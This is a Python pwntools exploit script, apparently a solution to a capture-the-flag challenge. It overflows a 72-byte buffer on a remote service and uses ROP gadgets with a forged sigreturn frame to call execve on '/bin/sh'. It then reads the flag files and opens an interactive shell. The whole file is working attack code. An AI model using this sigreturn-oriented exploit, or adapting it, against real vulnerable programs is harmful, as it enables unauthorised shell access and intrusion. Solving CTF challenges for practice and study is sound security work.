import os

nc, host, port = os.getenv("CONNECT").split(" ")

from pwn import remote, ELF, ROP, SigreturnFrame, flat, context

context.arch = "amd64"
offset = 72


def buildPayload(win_addr):
    elf = ELF("./handout/chal")
    elf.address = win_addr - elf.symbols["win"]
    rop = ROP(elf)
    rda_gadget = rop.find_gadget(["pop rax", "ret"])[0]
    syscall_gadget = rop.find_gadget(["syscall", "ret"])[0]

    sigframe = SigreturnFrame()
    sigframe.rip = syscall_gadget
    sigframe.rax = 59  # execve の syscall number
    sigframe.rdi = win_addr + 6  # "/bin/sh" のアドレス
    sigframe.rsi = 0  # NULL
    sigframe.rdx = 0  # NULL

    return flat(
        b"A" * offset,
        rda_gadget,
        15,  # rt_sigreturn の syscall number
        syscall_gadget,
        sigframe,
    )


# with open("payload.bin", "wb") as f:
#    f.write(buildPayload(0x555555555280))

conn = remote(host, port)
conn.recvuntil(b": ")
win_addr = int(conn.recvline().strip(), 16)
conn.sendline(buildPayload(win_addr))
conn.sendline(b"cat /flag*")
conn.interactive()
